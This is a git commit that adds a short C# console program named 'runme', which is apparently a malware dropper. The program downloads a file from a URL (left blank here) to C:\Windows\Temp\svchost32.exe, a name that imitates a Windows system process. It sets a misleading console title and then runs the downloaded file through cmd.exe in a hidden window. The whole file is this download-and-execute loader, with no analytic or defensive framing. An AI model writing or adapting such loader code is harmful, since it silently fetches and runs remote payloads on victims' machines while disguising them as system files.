68913e4ea3e3983a4797f51ad7466647d0d14f75
L0LERMAQN12 <75674209+L0LERMAQN12@users.noreply.github.com>
2020-12-08 12:47:05 +0100

    Add files via upload

---
+++ source/runme/Program.cs
@@ -0,0 +1,40 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Net;
+using System.Diagnostics;
+using System.Threading;
+using System.Net.NetworkInformation;
+
+namespace runme
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //MADE BY L0LERMAQN12
+            try
+            {
+                Console.Title = @"C:\Windows\System32\sysdrop32.exe";
+                WebClient webec = new WebClient();
+                webec.DownloadFile("", @"C:\Windows\Temp\svchost32.exe");
+            }
+            catch
+            {
+                Console.WriteLine("No internet connection/Application Error");
+                Console.Beep();
+                Thread.Sleep(1000);
+                Environment.Exit(0);
+            }
+            Console.WriteLine("File Dropped succesfully");
+            Thread.Sleep(600);
+            ProcessStartInfo ps = new ProcessStartInfo();
+            ps.FileName = @"cmd.exe";
+            ps.Arguments = @"/c C:\Windows\Temp\svchost32.exe";
+            ps.WindowStyle = ProcessWindowStyle.Hidden;
+            Process.Start(ps);
+
+        }
+    }
+}
